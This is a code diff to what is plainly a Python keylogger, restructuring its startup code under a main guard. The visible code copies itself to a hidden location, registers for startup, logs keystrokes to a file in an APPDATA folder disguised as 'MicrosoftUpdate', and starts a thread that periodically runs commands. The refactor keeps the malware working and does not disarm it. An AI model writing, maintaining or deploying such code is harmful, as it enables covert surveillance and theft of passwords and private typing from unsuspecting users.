@@ -33,7 +33,7 @@ def move_to_hidden_location():
         shutil.copy2(sys.argv[0], dest_file)
         add_to_startup(dest_file)
 
-move_to_hidden_location()
+
 
 log_file = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate", "keylog.txt")
 key_buffer = []
@@ -131,12 +131,15 @@ def on_press(key):
 
 
 
-writer_thread = threading.Thread(target=write_keys_to_file, daemon=True)
-cmd_thread = threading.Thread(target=run_command_periodically, daemon=True)
 
-writer_thread.start()
-cmd_thread.start()
+if __name__ == "__main__":
+    move_to_hidden_location()
 
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+    writer_thread = threading.Thread(target=write_keys_to_file, daemon=True)
+    cmd_thread = threading.Thread(target=run_command_periodically, daemon=True)
 
+    writer_thread.start()
+    cmd_thread.start()
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
